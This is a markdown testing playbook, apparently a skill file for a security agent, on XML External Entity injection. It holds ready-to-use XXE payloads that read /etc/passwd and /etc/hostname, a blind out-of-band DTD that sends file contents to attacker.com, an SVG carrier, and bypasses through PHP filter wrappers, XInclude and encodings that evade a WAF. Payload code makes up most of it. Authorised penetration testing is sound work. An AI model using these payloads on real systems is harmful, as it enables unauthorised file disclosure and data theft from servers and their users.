---
name: xxe-injection
category: injection
description: XML External Entity injection testing
attack_types:
  - xxe
  - injection
severity_range: [high, critical]
---

# XML External Entity (XXE) Injection

## Phase 1: Identify XML Endpoints
- Content-Type: `application/xml`, `text/xml`
- SOAP endpoints, RSS/Atom feeds
- File upload accepting: SVG, DOCX, XLSX, XML config
- API endpoints accepting XML alongside JSON

## Phase 2: Basic XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

## Phase 3: Blind XXE (Out-of-Band)
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```
External DTD (evil.dtd):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

## Phase 4: XXE via File Formats
### SVG
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

### DOCX/XLSX
- Unzip, modify `[Content_Types].xml` or embedded XML parts
- Re-zip and upload

## Phase 5: Bypass & Escalation
- CDATA exfiltration for XML-breaking characters
- PHP wrappers: `php://filter/convert.base64-encode/resource=/etc/passwd`
- Error-based: Force parser error containing file contents
- UTF-7/UTF-16 encoding to bypass WAF
- XInclude: `<xi:include href="file:///etc/passwd"/>` when DOCTYPE is blocked
